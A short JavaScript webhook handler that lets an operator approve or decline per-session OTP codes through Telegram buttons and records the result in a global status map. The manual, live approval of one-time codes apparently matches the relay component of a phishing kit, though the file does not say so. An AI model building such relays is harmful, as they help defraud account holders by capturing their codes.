// api/telegramWebhook.js
// Receives Telegram callback_query when admin clicks Proceed/Decline

if (!global._otpStatuses) global._otpStatuses = {};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TOKEN = process.env.TELEGRAM_TOKEN;
  let body = {};
  try { body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {}); }
  catch { return res.status(400).send('Bad JSON'); }

  const cb = body.callback_query;
  if (!cb) return res.status(200).send('ok'); // not a callback query

  const data = cb.data || '';          // e.g. "proceed_abc123" or "decline_abc123"
  const [action, sessionId] = data.split('_');

  if (sessionId && (action === 'proceed' || action === 'decline')) {
    global._otpStatuses[sessionId] = action;

    // Answer the callback so the button stops showing loading spinner
    const label = action === 'proceed' ? '✅ Approved' : '❌ Declined — resend required';
    await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: cb.id, text: label, show_alert: false }),
    });

    // Edit original message to show final state (remove buttons)
    const chatId = cb.message?.chat?.id;
    const messageId = cb.message?.message_id;
    if (chatId && messageId) {
      await fetch(`https://api.telegram.org/bot${TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } }),
      });
    }
  }

  return res.status(200).send('ok');
}
